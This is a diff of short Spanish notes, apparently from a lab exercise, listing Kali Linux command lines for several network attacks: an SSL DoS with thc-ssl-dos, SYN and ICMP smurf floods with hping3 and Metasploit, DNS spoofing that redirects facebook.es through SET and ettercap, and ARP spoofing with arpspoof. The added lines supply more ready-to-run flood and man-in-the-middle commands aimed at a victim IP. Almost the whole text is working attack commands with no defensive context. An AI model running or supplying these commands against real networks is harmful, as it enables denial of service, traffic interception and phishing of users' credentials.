@@ -1,6 +1,6 @@
 Ataque  THC-SSL-DOS
 En una terminal de kali Linux:
-  thc-ssl-dos  192.168.0.1 -p 443 --accept
+  *********************   thc-ssl-dos  192.168.0.1 -p 443 --accept
 	
 	
 Ataque  TCP-SYNC-FLOOD
@@ -10,6 +10,8 @@ En un terminal de kali Linux:
 	show options (para ver la forma de configuaracion)
 	set rhost 192.168.0.1(ip del atacado)
 	exploit
+	***********************    hping3 --syn -i u1 -S -p 80 IP( VICTIMA)
+	
 	
 	hpinh3 -p 80 -S --flood 192.168.0.1 
 	
@@ -22,6 +24,8 @@ En una terminal de Kali Linux, ubicandoneos en al carpoeta smurf (descargada)
 	2.- ataque
 	./smurf 192.168.0.1 broadcast.txt  0 0 1024 
 	
+	***************************   hping3 -1 --flood IP(VICTIMA) -a IP(BROADCAST)
+	
 Ataque DNS SPOOFING
 En kali Linux: Aplicaciones –> Kali Linux –> Exploitation Tools –> Social Engineering Toolkit –> se-toolkit
 	1 , 2 , 3 , 2
@@ -32,4 +36,10 @@ En kali Linux: Aplicaciones –> Kali Linux –> Exploitation Tools –> Social 
 	http://www.facebook.es A  IP_destino
 	*.facebook.* A  IP_destino
 	http://www.facebook.es PTR  IP_destino
+	
+	****************************    ettercap -Tqi eth1 -P dns_spoof -M arp // //
+	
+Ataque ARP_SPOOFING
+	*****************************    arpspoof -i eth1 -t IP(VICTIMA) IP(A SUPLANTA)
+	
 
